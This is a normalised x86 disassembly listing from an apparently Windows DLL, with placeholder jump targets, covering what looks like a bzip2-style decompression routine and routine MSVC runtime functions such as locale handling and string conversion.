jg r-xdata
mov edi [ ebx + 0xc50 ]
movzx si cl
mov [ edi + eax * 2 ] si
inc eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
jg r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
and [ ebx + 0x444 ] 0x0
mov edx 0x100
lea eax [ ebx + 0x448 ]
mov ecx edx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
inc [ eax ]
test esi esi
jle r-xdata
lea edx [ ebx + 0xe7c ]
test edi edi
jbe r-xdata
lea ecx [ ebx + 0xe7b ]
lea eax [ ecx + edx ]
mov edx ebx
sub edx ecx
add edx 0xe7c
mov [ ebp - 0x68 ] edx
mov edx ebx
sub edx ecx
add edx 0xe7a
mov [ ebp - 0x7c ] edx
mov edx ebx
sub edx ecx
add edx 0xe78
mov [ ebp - 0x78 ] edx
mov edx ebx
sub edx ecx
lea esi [ edi - 0x4 ]
add edx 0xe79
shr esi 0x2
add eax edi
mov [ ebp - 0x38 ] edx
inc esi
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
cmp ecx [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
mov esi [ eax - 0x4 ]
add [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
and [ ebp - 0x10 ] ecx
lea eax [ ebx + 0x444 ]
lea eax [ ebx + 0x1e7c ]
dec [ eax ]
mov edx [ eax ]
mov [ ebx + edx + 0xe7c ] cl
cmp [ eax ] 0x0
jne r-xdata
mov edi eax
mov al [ edx + edi - 0x1 ]
mov [ edx + edi ] al
dec edi
lea eax [ ebx + esi * 4 + 0x1e7c ]
cmp edi [ eax ]
jg r-xdata
mov [ eax + 0xe7c ] cl
jmp r-xdata
lea esi [ eax + 0xe7c ]
mov cl [ eax ]
mov edx [ ebp - 0x68 ]
mov [ edx + eax ] cl
mov ecx [ ebp - 0x7c ]
add ecx eax
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ebp - 0x38 ]
mov dl [ edx + eax ]
mov [ ecx ] dl
mov ecx [ ebp - 0x78 ]
mov cl [ ecx + eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + eax ] cl
sub edi 0x4
sub eax 0x4
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x55 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
movzx eax cl
lea eax [ eax + ebx + 0xd7c ]
movzx ecx [ eax ]
lea ecx [ ebx + ecx * 4 + 0x40 ]
inc [ ecx ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov edi 0xfff
mov [ ebp - 0x38 ] 0xf
lea esi [ ebx + 0x1eb8 ]
dec [ edi ]
mov edx [ edi - 0x4 ]
mov eax [ edi ]
mov dl [ edx + ebx + 0xe8b ]
dec esi
sub edi 0x4
mov [ ebx + eax + 0xe7c ] dl
test esi esi
jg r-xdata
mov dl [ esi + edi - 0x1 ]
mov [ esi + edi ] dl
dec edi
jne r-xdata
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ eax ]
mov ecx [ ebx + 0xc4c ]
mov [ ecx + edx * 4 ] eax
movzx ax [ eax ]
mov ecx [ ebx + 0xc50 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ esi ]
add eax ebx
mov al [ eax + edx + 0xe7c ]
mov [ edi + ebx + 0xe7c ] al
dec edi
dec [ ebp - 0x68 ]
jns r-xdata
dec [ ebp - 0x38 ]
lea eax [ edi + 0x1 ]
mov [ esi ] eax
sub esi 0x4
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebx + 0x444 ]
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x68 ] 0xf
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
mov esi [ ecx ]
cmp esi [ ecx + 0x4 ]
jg r-xdata
and [ ebx + 0xc ] 0x0
or [ ebx + 0xc60 ] 0xffffffff
push 0x2
pop ecx
cmp [ ebx + 0x30 ] ecx
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] ecx
jl r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
pop ecx
xor eax eax
pop ecx
inc eax
xor esi esi
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jle r-xdata
xor edx edx
cmp [ ebp - 0x18 ] edx
lea edi [ ebx + 0x848 ]
mov ecx 0x101
lea esi [ ebx + 0x444 ]
[ edi ] [ esi ]
jle r-xdata
mov ecx [ ebx + 0xc4c ]
mov edx [ ebx + 0x34 ]
mov edx [ ecx + edx * 4 ]
mov esi [ ebx + 0x24 ]
shr edx 0x8
imul esi esi 0x186a0
mov [ ebx + 0x38 ] edx
xor edx edx
mov [ ebx + 0x440 ] edx
cmp [ ebx + 0x10 ] dl
je r-xdata
mov edx [ ebx + 0xc4c ]
movzx ecx [ edx + esi * 4 ]
lea ecx [ ebx + ecx * 4 + 0x444 ]
mov edi [ ecx ]
lea edx [ edx + edi * 4 ]
mov edi esi
shl edi 0x8
or [ edx ] edi
inc [ ecx ]
inc esi
cmp esi [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
movzx edi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
jmp r-xdata
mov ecx [ ebx + 0xc50 ]
lea ecx [ ecx + edx * 2 ]
movzx esi [ ecx ]
lea esi [ ebx + esi * 4 + 0x848 ]
mov di [ esi ]
mov [ ecx ] di
test dl 0x1
jne r-xdata
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] edx
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebp - 0x10 ] esi
mov esi [ ebx + 0xc54 ]
mov ecx edi
sar ecx 0x1
movzx esi [ esi + ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] edi
and [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x1c ]
mov eax [ ebx + 0xc50 ]
shl cl 0x2
shr esi cl
lea eax [ eax + edi * 2 ]
movzx ecx [ eax ]
and esi 0xf
shl esi 0x10
or esi ecx
mov ecx [ ebp - 0x38 ]
mov [ eax ] dx
mov eax [ ebx + 0xc54 ]
add eax ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0xc54 ]
mov eax edx
sar eax 0x1
lea edi [ eax + ecx ]
mov eax [ esi ]
mov ecx [ esi ]
sar eax 0xc
xor al [ edi ]
sar ecx 0xc
and al 0xf
xor al cl
mov [ edi ] al
xor eax eax
inc eax
mov edi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
add edi ecx
mov cl [ edi ]
and cl 0xf0
or cl [ esi + 0x2 ]
mov [ edi ] cl
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
mov ecx [ rw-data ]
mov [ ebx + 0x14 ] ecx
dec [ ebx + 0x14 ]
mov ecx [ ebx + 0x14 ]
xor edx edx
cmp ecx eax
sete dl
mov [ ebx + 0x18 ] eax
xor [ ebx + 0x3c ] edx
jmp r-xdata
mov ecx edx
sar ecx 0xc
xor cl [ eax ]
sar edx 0xc
and cl 0xf
xor cl dl
mov [ eax ] cl
mov cl [ eax ]
sar edx 0x10
and cl 0xf0
or dl cl
mov [ eax ] dl
jmp r-xdata
inc [ esi ]
inc edx
cmp edx [ ebp - 0x18 ]
jl r-xdata
xor eax eax
inc eax
mov eax [ ebx + 0x34 ]
xor ecx ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
cmp [ ebx + 0x10 ] cl
je r-xdata
mov edx edi
mov edi esi
cmp edx [ ebx + 0x34 ]
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jae r-xdata
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jb r-xdata
xor eax eax
inc eax
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1000d143
mov edx [ ebx + 0xc54 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebx + 0x34 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edx ]
movzx ecx al
and cl 0x1
shl cl 0x2
shr edx cl
mov ecx [ ebx + 0xc50 ]
movzx eax [ ecx + eax * 2 ]
and edx 0xf
shl edx 0x10
or edx eax
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x440 ] 0x1
jmp r-xdata
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1000d143
mov edx [ ebx + 0x34 ]
mov esi eax
pop ecx
mov [ ebx + 0x3c ] esi
mov eax edx
shr eax 0x1
pop ecx
mov ecx [ ebx + 0xc54 ]
movzx eax [ eax + ecx ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr eax cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
xor ecx ecx
inc ecx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
mov eax [ rw-data ]
mov [ ebx + 0x14 ] eax
dec [ ebx + 0x14 ]
mov edi [ ebx + 0x14 ]
xor eax eax
cmp edi ecx
sete al
mov [ ebx + 0x18 ] ecx
xor eax esi
mov [ ebx + 0x3c ] eax
sub_1000f89b
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
xor ecx ecx
cmp esi [ ebp + 0x14 ]
push edi
mov ebx eax
mov [ ebp - 0x4 ] esi
jg r-xdata
push 0x17
xor eax eax
pop ecx
mov edi edx
[ edi ]
xor ecx ecx
cmp [ ebp + 0x18 ] ecx
jle r-xdata
xor eax eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
xor ecx ecx
inc ecx
movzx eax [ ecx + ebx ]
lea eax [ edx + eax * 4 + 0x4 ]
inc [ eax ]
inc ecx
cmp ecx [ ebp + 0x18 ]
jl r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
movzx edi [ eax + ebx ]
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov edi [ edx + ecx * 4 - 0x4 ]
lea eax [ edx + ecx * 4 ]
add [ eax ] edi
inc ecx
cmp ecx 0x17
jl r-xdata
mov edi [ ebp + 0x8 ]
push 0x17
xor eax eax
and [ ebp + 0x18 ] eax
pop ecx
[ edi ]
mov ecx [ ebp + 0x14 ]
cmp esi ecx
jg r-xdata
inc eax
cmp eax [ ebp + 0x18 ]
jl r-xdata
mov edi [ ebp + 0xc ]
mov [ edi + ecx * 4 ] eax
inc ecx
lea eax [ esi + 0x1 ]
cmp eax [ ebp + 0x14 ]
jg r-xdata
mov edi [ ebp + 0x8 ]
sub edi edx
sub ecx esi
lea eax [ edx + esi * 4 ]
mov [ ebp - 0x4 ] edi
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax * 4 - 0x4 ]
mov ebx [ ebp - 0x4 ]
lea esi [ eax + 0x4 ]
mov edi [ esi ]
sub edi [ eax ]
add [ ebp + 0x18 ] edi
mov edi [ ebp + 0x18 ]
shl [ ebp + 0x18 ] 0x1
dec edi
dec ecx
mov [ ebx + eax ] edi
mov eax esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov esi [ ecx ]
lea esi [ esi + esi + 0x2 ]
sub esi [ edx + eax * 4 ]
add ecx 0x4
mov [ edx + eax * 4 ] esi
inc eax
cmp eax [ ebp + 0x14 ]
jle r-xdata
sub_1000f99d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000109b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000f9c4
push 0x44
mov eax sub_10026d8e
call sub_10014213
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_100010e2
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10013de1
int3
sub_1000f9fc
push 0x44
mov eax sub_10026d8e
call sub_10014213
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000f975
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10013de1
int3
sub_1000fa80
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000fa6b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000faa1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_100086a1
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1000fac2
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000fe10
push rw-data
call sub_1000faa1
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_1000fe38
leave
retn
sub_1000faf4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_1000fac2
mov [ rw-data ] 0x1
call sub_100106fe
pop ecx
sub_1000fb1e
push 0x4
mov eax sub_100268e8
call sub_10014213
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1000fe10
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
ja r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10011c31
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_1000fe38
call sub_100142eb
retn
mov ecx [ eax ]
call sub_100086a1
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1000fb7e
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000fe10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
push 0x1
mov [ rw-data ] eax
call sub_1000fa80
lea ecx [ ebp - 0x4 ]
call sub_1000fe38
leave
retn
sub_1000fbb3
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_10010c96
pop ecx
test eax eax
je r-xdata
push sub_1000fb7e
call sub_1000fa51
pop ecx
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_1000fbf1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
pop ebp
retn
cmp [ eax + 0x54 ] 0x10
jb r-xdata
add eax 0x40
mov eax [ eax + 0x40 ]
jmp r-xdata
push eax
push 0x0
call sub_10015589
pop ecx
pop ecx
sub_1000fc19
push 0x4
mov eax sub_1002690b
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] al
call sub_100016bc
mov eax esi
call sub_100142eb
retn 0x4
sub_1000fc62
push 0x4
mov eax sub_10026939
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1000fb1e
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_1000197b
mov [ esi ] r--data
call sub_100142eb
retn
sub_1000fc9f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000fc62
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000fcc0
push 0x8
mov eax sub_10026966
call sub_10014213
mov eax [ rw-data ]
mov esi eax
test eax eax
jne r-xdata
mov eax esi
call sub_100142eb
retn
push eax
lea ecx [ ebp - 0x10 ]
call sub_1000fe10
mov eax [ rw-data ]
and [ ebp - 0x4 ] esi
mov esi eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_1000fe38
push 0x34
call sub_10010c96
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor esi esi
push esi
call sub_1000fc19
mov esi eax
jmp r-xdata
push esi
mov [ ebp - 0x4 ] 0x0
call sub_1000faf4
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_1000195e
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_1000fd5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
push esi
push edi
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x3c ]
call sub_1000195e
test esi esi
je r-xdata
mov eax r--data
push 0x0
push 0x0
call sub_10015589
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push esi
push 0x0
call sub_10015589
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ edi + 0x58 ]
call sub_1000195e
pop edi
pop esi
pop ebp
retn
sub_1000fdb6
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_10010749
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_1000fde7
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jge r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_10010759
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_1000fe10
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
mov [ esi ] eax
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_10010769
pop ecx
sub_1000fe4f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_1000fe76
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov ecx esi
call sub_1000fe4f
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
and [ esi + 0x1c ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_10010ba2
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn
mov edi [ eax ]
push eax
call sub_10010ba2
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_1000fec1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
push esi
call sub_1000fe76
pop ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + rw-data ]
mov eax [ esi + 0x4 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
pop esi
pop ebp
retn
push 0x1
call sub_100082c2
sub_1000fefd
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_10010c96
push eax
mov [ esi ] eax
call sub_10010749
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_1000ff45
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ebx edx
mov edi edx
and ebx 0x4
and edi 0x80
test dl 0x40
je r-xdata
test dl 0x8
je r-xdata
or edx 0x1
xor ecx ecx
and edx 0xffffff3b
xor eax eax
inc ecx
or edx 0x2
mov esi eax
shl esi 0x2
cmp [ esi + r--data ] 0x0
jne r-xdata
mov ecx [ eax * 4 + r--data ]
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx edx
je r-xdata
push [ ebp + 0x10 ]
mov esi [ esi + rw-data ]
push esi
push [ ebp + 0x8 ]
call sub_100163c5
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test dl 0x1
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
push r--data
push [ ebp + 0x8 ]
call sub_100163c5
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_10011554
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_100119e7
pop ecx
jmp r-xdata
sub_1000fffd
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_1001668a
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10015494
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10010789
leave
retn
sub_1001003f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_100166a9
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1000fffd
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_10014931
push esi
call sub_10011c31
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10011c31
pop ecx
mov [ esi + 0x4 ] ebx
sub_100100dc
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_10014931
push esi
call sub_10011c31
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1001012d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_10016c49
mov esi [ eax + 0x8 ]
call sub_10016c23
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1001003f
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_10016c07
cmp eax 0x1
pop ecx
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx cx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_10016788
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10016c07
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_10016c07
cmp eax 0x1
pop ecx
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_10016c07
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10016c07
pop ecx
jmp r-xdata
jmp r-xdata
sub_100102a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10016c49
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10016c23
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
